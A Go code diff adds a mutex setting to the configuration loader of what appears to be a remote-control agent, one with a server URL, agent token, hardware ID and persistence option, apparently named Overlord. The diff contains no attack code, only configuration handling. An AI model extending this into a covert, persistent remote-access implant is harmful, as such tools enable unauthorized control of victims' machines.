@@ -17,6 +17,7 @@ const AgentVersion = "0"
 
 var DefaultPersistence = "false"
 var DefaultServerURL = "wss://127.0.0.1:5173"
+var DefaultMutex = ""
 var DefaultID = ""
 var DefaultCountry = ""
 var DefaultAgentToken = ""
@@ -38,6 +39,7 @@ type serverIndexData struct {
 type Config struct {
 	ServerURLs            []string
 	ServerIndex           int
+	Mutex                 string
 	ID                    string
 	HWID                  string
 	Country               string
@@ -109,6 +111,15 @@ func Load() Config {
 		tokenSource = "build-time"
 	}
 
+	mutex := strings.TrimSpace(os.Getenv("OVERLORD_MUTEX"))
+	if mutex == "" {
+		mutex = DefaultMutex
+	}
+	mutexLower := strings.ToLower(strings.TrimSpace(mutex))
+	if mutexLower == "none" || mutexLower == "disabled" {
+		mutex = ""
+	}
+
 	if agentToken != "" {
 		log.Printf("[config] Agent token loaded from %s (len=%d)", tokenSource, len(agentToken))
 	} else {
@@ -118,6 +129,7 @@ func Load() Config {
 	return Config{
 		ServerURLs:            serverURLs,
 		ServerIndex:           serverIndex,
+		Mutex:                 strings.TrimSpace(mutex),
 		ID:                    firstNonEmpty(fileSettings.ID, DefaultID, defaultID),
 		HWID:                  firstNonEmpty(fileSettings.HWID, defaultHWID),
 		EnablePersistence:     enablePersistence,
